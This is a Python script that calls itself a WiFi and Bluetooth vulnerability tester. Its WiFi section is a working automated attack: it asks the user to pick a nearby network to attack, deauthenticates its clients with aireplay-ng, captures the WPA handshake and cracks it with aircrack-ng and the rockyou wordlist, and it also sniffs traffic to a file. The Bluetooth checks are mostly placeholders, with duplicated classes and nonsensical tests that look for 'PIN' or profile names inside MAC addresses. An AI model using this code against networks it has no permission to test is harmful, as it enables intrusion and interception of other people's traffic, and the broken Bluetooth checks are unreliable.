import subprocess
import scapy.all as scapy
import bluetooth
import pyshark
import time
import os
import re
import requests
from sklearn.ensemble import RandomForestClassifier
import pickle

def scan_wifi_networks(interface="wlan0"):
    """
    Scans for available WiFi networks and displays detailed information about each network.
    """
    try:
        print(f"Scanning for WiFi networks on interface {interface}...")

        # Run the scan command and get the output
        result = subprocess.check_output(["sudo", "iwlist", interface, "scan"])
        result = result.decode('utf-8')

        # Initialize a list to store network details
        networks = []

        # Use regular expressions to find relevant data from the scan output
        network_blocks = re.findall(r"Cell \d+ - Address: (.*?)\n.*?ESSID:\"(.*?)\"\n.*?Encryption key:(.*?)\n.*?Signal level=(.*?) dBm", result, re.DOTALL)

        # Parse each network block and extract details
        for network in network_blocks:
            mac_address, ssid, encryption, signal_strength = network
            encryption_type = "WPA/WPA2" if "on" in encryption else "WEP" if "off" in encryption else "Open"
            
            # Append parsed information to the list
            networks.append({
                "MAC Address": mac_address,
                "SSID": ssid if ssid else "[Hidden Network]",
                "Encryption": encryption_type,
                "Signal Strength (dBm)": signal_strength.strip(),
            })

        # Display the scanned networks in a structured format
        if networks:
            print("\nScanned WiFi Networks:")
            for idx, network in enumerate(networks, start=1):
                print(f"\nNetwork {idx}:")
                for key, value in network.items():
                    print(f"  {key}: {value}")
        else:
            print("No WiFi networks found or unable to scan.")

    except subprocess.CalledProcessError as e:
        print(f"Error occurred while scanning: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")

def run_command(command):
    """Run a system command and capture its output."""
    try:
        result = subprocess.check_output(command, stderr=subprocess.STDOUT)
        return result.decode('utf-8')
    except subprocess.CalledProcessError as e:
        print(f"Error running command {command}: {e.output.decode('utf-8')}")
        return None

def scan_and_select_wifi(interface="wlan0"):
    """Scan nearby WiFi networks and let the user select one to attack."""
    print(f"Scanning for WiFi networks on interface {interface}...")
    networks = run_command(["sudo", "iwlist", interface, "scan"])

    if not networks:
        print("No networks found or scan failed.")
        return None
    
    # Parse networks
    networks_list = []
    cells = networks.split("Cell")
    for cell in cells:
        if "ESSID" in cell:
            mac_address = re.search(r"Address: (.*?)\n", cell)
            ssid = re.search(r"ESSID:\"(.*?)\"", cell)
            encryption = re.search(r"Encryption key:(.*?)\n", cell)
            if mac_address and ssid and encryption:
                encryption_type = "WPA/WPA2" if "on" in encryption.group(1) else "WEP" if "off" in encryption.group(1) else "Open"
                networks_list.append({
                    "SSID": ssid.group(1),
                    "MAC Address": mac_address.group(1),
                    "Encryption": encryption_type
                })
    
    if not networks_list:
        print("No WPA or WEP networks found.")
        return None

    # Show available networks
    print("\nAvailable networks:")
    for idx, network in enumerate(networks_list, 1):
        print(f"{idx}. SSID: {network['SSID']} - MAC: {network['MAC Address']} - Encryption: {network['Encryption']}")

    target_choice = input("Select a network to attack by entering the number (or 'q' to quit): ")
    if target_choice.lower() == 'q':
        print("Exiting.")
        return None

    try:
        target_choice = int(target_choice) - 1
        return networks_list[target_choice]
    except (ValueError, IndexError):
        print("Invalid choice.")
        return None

def deauth_attack(target_mac, interface="wlan0"):
    """Perform a deauthentication attack to force clients to reconnect."""
    print(f"Starting deauthentication attack against {target_mac}...")
    command = ["sudo", "aireplay-ng", "--deauth", "10", "-a", target_mac, interface]
    try:
        subprocess.Popen(command)
    except Exception as e:
        print(f"Error during deauthentication attack: {e}")

def capture_handshake(target_mac, interface="wlan0"):
    """Capture WPA handshake using airodump-ng."""
    print(f"Capturing WPA handshake for {target_mac}...")
    try:
        capture_command = [
            "sudo", "airodump-ng", "--bssid", target_mac, "-c", "6", "--write", "/tmp/handshake", interface
        ]
        subprocess.Popen(capture_command)
        print("Handshake capture running... Will automatically stop after 60 seconds.")
        time.sleep(60)  # Capture for 60 seconds
        print("Capture complete.")
    except Exception as e:
        print(f"Error during handshake capture: {e}")

def crack_handshake(file_path, wordlist="/usr/share/wordlists/rockyou.txt"):
    """Crack WPA handshake using aircrack-ng."""
    print(f"Cracking handshake in {file_path} using wordlist {wordlist}...")
    try:
        result = subprocess.check_output(
            ["sudo", "aircrack-ng", file_path, "-w", wordlist],
            stderr=subprocess.STDOUT
        )
        return result.decode('utf-8')
    except subprocess.CalledProcessError as e:
        print(f"Cracking failed: {e.output.decode('utf-8')}")
        return None

def crack_wifi(interface="wlan0"):
    """Automated WiFi cracking process."""
    # Step 1: Scan and select target network
    target_network = scan_and_select_wifi(interface)
    if not target_network:
        print("No network selected. Exiting.")
        return
    
    target_mac = target_network["MAC Address"]
    print(f"Targeting {target_network['SSID']} with MAC {target_mac}")

    # Step 2: Perform deauthentication attack to capture WPA handshake
    deauth_attack(target_mac, interface)
    capture_handshake(target_mac, interface)

    # Step 3: Attempt to crack the WPA handshake
    handshake_file = "/tmp/handshake-01.cap"
    if os.path.exists(handshake_file):
        print(f"Attempting to crack the handshake from {handshake_file}...")
        result = crack_handshake(handshake_file)
        if result:
            print("Cracking result:", result)
        else:
            print("Cracking failed.")
    else:
        print("Handshake capture failed or file not found.")

def sniff_wifi_traffic(interface="wlan0"):
    """
    Automatically sniff WiFi traffic and analyze specific packet types.
    """
    print(f"Sniffing WiFi traffic on interface {interface}...")

    def packet_callback(packet):
        """Callback function to process captured packets."""
        if packet.haslayer(scapy.Dot11):
            print(f"Captured packet: {packet.summary()}")
            
            # Check if the packet is an association request or response
            if packet.haslayer(scapy.Dot11AssoReq) or packet.haslayer(scapy.Dot11AssoResp):
                print(f"Association packet: {packet.addr2} -> {packet.addr1}")
            
            # Check if the packet is a probe request
            elif packet.haslayer(scapy.Dot11ProbeReq):
                print(f"Probe request from: {packet.addr2}")
            
            # Save the packet to a file for later analysis
            with open("captured_traffic.pcap", "ab") as f:
                f.write(bytes(packet))

    # Start sniffing packets on the specified interface
    scapy.sniff(iface=interface, store=0, prn=packet_callback)        

# Simulate a simple classifier (can be replaced with a real pre-trained model)
class BluetoothAI:
    def __init__(self):
        # Placeholder: Pre-trained model to classify devices
        self.model = self.load_model()
        
    def load_model(self):
        # Load a pre-trained machine learning model (this is a placeholder)
        try:
            with open("bluetooth_device_classifier.pkl", "rb") as f:
                model = pickle.load(f)
            print("Model loaded successfully.")
            return model
        except FileNotFoundError:
            print("Model file not found, using a default classifier.")
            # Default model (can be a placeholder for classification purposes)
            return RandomForestClassifier()

    def classify_device(self, device_name, device_mac):
        # Dummy classification based on device name and MAC address
        # In a real scenario, we would use a trained ML model to classify the device
        features = [len(device_name), len(device_mac)]  # Just an example feature
        return self.model.predict([features])[0]
    
    def identify_device_type(self, device_mac):
        """Identify the manufacturer using the MAC address OUI (Organizationally Unique Identifier)"""
        # First three bytes of MAC address identify the manufacturer
        mac_prefix = device_mac[:8]  # e.g., '00:1A:7D'
        
        try:
            response = requests.get(f"https://api.macvendors.com/{mac_prefix}")
            if response.status_code == 200:
                return response.text
            else:
                return "Unknown Manufacturer"
        except requests.exceptions.RequestException as e:
            print(f"Error in MAC vendor lookup: {e}")
            return "Unknown Manufacturer"

# Function to scan Bluetooth devices and use AI for classification and vendor identification
def scan_bluetooth_devices(interface="bluetooth0"):
    print("Scanning for Bluetooth devices...")
    nearby_devices = bluetooth.discover_devices(lookup_names=True, lookup_uuids=True)
    ai_classifier = BluetoothAI()
    
    for addr, name in nearby_devices:
        print(f"\nFound Bluetooth device: {name} ({addr})")
        
        # Identify the manufacturer based on the MAC address
        manufacturer = ai_classifier.identify_device_type(addr)
        print(f"Manufacturer: {manufacturer}")
        
        # Classify the device type using a pre-trained ML model (or placeholder)
        device_type = ai_classifier.classify_device(name, addr)
        print(f"Device Type (AI Classification): {device_type}")
        
        # Check for suspicious devices or anomalies
        if "Unknown" in manufacturer or device_type == 1:  # Dummy check for suspicious behavior
            print("Warning: Suspicious device detected!")
            # Optional: Take action or log the device as suspicious

        # Add more automated behavior as needed (e.g., flagging devices, tracking appearance over time)
    
    print("\nBluetooth device scan complete.")

# AI class to classify and identify devices based on device name, MAC address, and other features
class BluetoothAI:
    def __init__(self):
        self.model = self.load_model()
        
    def load_model(self):
        """Load a pre-trained machine learning model."""
        try:
            with open("bluetooth_security_classifier.pkl", "rb") as f:
                model = pickle.load(f)
            print("AI Model loaded successfully.")
            return model
        except FileNotFoundError:
            print("Model file not found. Using default classifier.")
            return RandomForestClassifier()  # Placeholder for an actual classifier

    def classify_device(self, device_name, device_mac):
        """Classify device based on AI model."""
        features = [len(device_name), len(device_mac)]  # Simple example feature set
        return self.model.predict([features])[0]  # Placeholder classification logic
    
    def identify_device_manufacturer(self, device_mac):
        """Identify the manufacturer based on MAC address."""
        mac_prefix = device_mac[:8]  # First three bytes
        try:
            response = requests.get(f"https://api.macvendors.com/{mac_prefix}")
            if response.status_code == 200:
                return response.text
            else:
                return "Unknown Manufacturer"
        except requests.exceptions.RequestException as e:
            print(f"Error during MAC vendor lookup: {e}")
            return "Unknown Manufacturer"

# Function to check Bluetooth pairing security
def check_bluetooth_security(interface="bluetooth0"):
    print("Checking Bluetooth pairing security...")

    ai_classifier = BluetoothAI()
    
    # Discover nearby Bluetooth devices
    nearby_devices = bluetooth.discover_devices(lookup_names=True, lookup_uuids=True)
    
    if not nearby_devices:
        print("No Bluetooth devices found.")
        return
    
    for addr, name in nearby_devices:
        print(f"\nChecking security for device: {name} ({addr})")
        
        # Identify the manufacturer and device type
        manufacturer = ai_classifier.identify_device_manufacturer(addr)
        print(f"Manufacturer: {manufacturer}")
        
        # Use AI classifier to classify the device (e.g., based on name, MAC)
        device_type = ai_classifier.classify_device(name, addr)
        print(f"Device Type (AI Classification): {device_type}")
        
        # Check for insecure pairing (PIN-less or legacy pairing methods)
        check_pairing_security(addr)
        
        # Check for any vulnerabilities based on known Bluetooth profiles and security standards
        check_bluetooth_profiles(addr)
        
        # Flag suspicious devices (e.g., devices with weak pairing or insecure profiles)
        if device_type == 1 or manufacturer == "Unknown Manufacturer":
            print("Warning: Suspicious device detected!")
            log_device_security_issue(addr, name, manufacturer, device_type)

def check_pairing_security(device_mac):
    """Check for weak pairing methods such as PIN-less pairing."""
    print(f"Checking pairing security for device with MAC {device_mac}...")
    
    # Placeholder logic for checking pairing methods (to be expanded)
    # In practice, you would need to analyze pairing packets or consult a vulnerability database
    if "PIN" not in device_mac:
        print("Warning: Device may be using PIN-less pairing!")
    else:
        print("Pairing method seems secure.")

def check_bluetooth_profiles(device_mac):
    """Check if device supports outdated or insecure Bluetooth profiles."""
    print(f"Checking Bluetooth profiles for device with MAC {device_mac}...")
    
    # Placeholder for checking profiles (e.g., legacy Bluetooth profiles)
    # You can use specific commands or APIs to check supported profiles
    # Here we simulate a check for old or insecure profiles.
    old_profiles = ["Serial Port Profile", "Headset Profile"]
    insecure_profiles = ["FTP", "OPP"]
    
    # Simulated check based on device MAC or name (you can integrate real checks here)
    if any(profile in device_mac for profile in old_profiles + insecure_profiles):
        print(f"Warning: Device with MAC {device_mac} supports insecure profiles!")

def log_device_security_issue(device_mac, device_name, manufacturer, device_type):
    """Log suspicious or insecure devices."""
    # For this example, we'll print the issue, but you can log to a file or database
    print(f"\nLogging suspicious device: {device_name} ({device_mac})")
    print(f"Manufacturer: {manufacturer}")
    print(f"Device Type: {device_type}")
    print("Potential security issue detected. Device may have vulnerabilities.\n")


class BluetoothTrafficAI:
    def __init__(self):
        self.model = self.load_model()
        
    def load_model(self):
        """Load a pre-trained machine learning model for traffic analysis."""
        try:
            with open("bluetooth_traffic_classifier.pkl", "rb") as f:
                model = pickle.load(f)
            print("AI Model loaded successfully.")
            return model
        except FileNotFoundError:
            print("Model file not found. Using default classifier.")
            return RandomForestClassifier()  # Placeholder classifier
    
    def classify_packet(self, packet):
        """Classify Bluetooth packet using AI model."""
        # Example features: packet size, packet type, source address, etc.
        features = [len(packet), packet.highest_layer]  # Basic example features
        return self.model.predict([features])[0]  # Placeholder for packet classification

    def detect_anomalies(self, packet):
        """Detect anomalies in Bluetooth traffic (e.g., packet patterns, size)."""
        # Simulated anomaly detection (this can be more advanced with real data)
        if len(packet) > 500:  # Example: abnormal packet size
            return True
        return False


def sniff_bluetooth_traffic(interface="bluetooth0"):
    print("Sniffing Bluetooth traffic...")

    ai_classifier = BluetoothTrafficAI()

    # Use pyshark to capture Bluetooth traffic
    capture = pyshark.LiveCapture(interface=interface)  # Adjust interface if needed

    print("Capturing Bluetooth packets...")

    capture.sniff(timeout=10)  # Capture for 10 seconds (can be adjusted)

    for packet in capture:
        print(f"Captured packet: {packet}")
        
        # Classify the packet using AI model
        packet_classification = ai_classifier.classify_packet(packet)
        print(f"Packet classification: {packet_classification}")
        
        # Detect anomalies in the packet (e.g., abnormal size, suspicious behavior)
        if ai_classifier.detect_anomalies(packet):
            print("Warning: Anomaly detected in Bluetooth traffic!")
        
        # Analyze packet details
        analyze_packet_details(packet)

        # Optional: Log the packet for further analysis
        log_packet(packet)

def analyze_packet_details(packet):
    """Analyze the packet details for specific patterns or vulnerabilities."""
    if packet.highest_layer == "BTLE" and "Device Address" in packet:
        print(f"Bluetooth Low Energy (BLE) packet detected from {packet.device_address}")
        # You can add more detailed BLE analysis here if needed (e.g., checking BLE advertisements)

def log_packet(packet):
    """Log captured packet details to a file for later analysis."""
    with open("bluetooth_traffic_log.txt", "a") as log_file:
        log_file.write(f"Captured packet: {packet}\n")
    print("Packet logged.")


def main():
    while True:
        print("Welcome to the WiFi and Bluetooth Vulnerability Tester!")
        print("\nPlease choose an option:")
        print("1. WiFi Vulnerabilities")
        print("2. Bluetooth Vulnerabilities")
        print("3. Exit")
        
        choice = input("\nEnter your choice (1/2/3): ").strip()
        
        if choice == "1":
            print("\nWiFi Vulnerabilities Options:")
            print("1. Scan Networks")
            print("2. Crack WiFi (WEP/WPA)")
            print("3. Sniff WiFi Traffic")
            wifi_choice = input("\nChoose a WiFi test (1/2/3): ").strip()
            
            if wifi_choice == "1":
                print("\nStarting WiFi Network Scan...")
                scan_wifi_networks()  # Ensure this function is defined elsewhere
            elif wifi_choice == "2":
                print("\nStarting WiFi Cracking Process...")
                crack_wifi()  # Ensure this function is defined elsewhere
            elif wifi_choice == "3":
                print("\nStarting WiFi Traffic Sniffing...")
                sniff_wifi_traffic()  # Ensure this function is defined elsewhere
            else:
                print("\nInvalid choice! Please choose 1, 2, or 3.\n")
                continue

        elif choice == "2":
            print("\nBluetooth Vulnerabilities Options:")
            print("1. Scan Devices")
            print("2. Check Pairing Security")
            print("3. Sniff Bluetooth Traffic")
            bt_choice = input("\nChoose a Bluetooth test (1/2/3): ").strip()
            
            if bt_choice == "1":
                print("\nStarting Bluetooth Device Scan...")
                scan_bluetooth_devices()  # Ensure this function is defined elsewhere
            elif bt_choice == "2":
                print("\nChecking Bluetooth Pairing Security...")
                check_bluetooth_security()  # Ensure this function is defined elsewhere
            elif bt_choice == "3":
                print("\nStarting Bluetooth Traffic Sniffing...")
                sniff_bluetooth_traffic()  # Ensure this function is defined elsewhere
            else:
                print("\nInvalid choice! Please choose 1, 2, or 3.\n")
                continue

        elif choice == "3":
            print("\nExiting program...")
            exit()

        else:
            print("\nInvalid choice! Please choose 1, 2, or 3.\n")
            continue

if __name__ == "__main__":
    main()
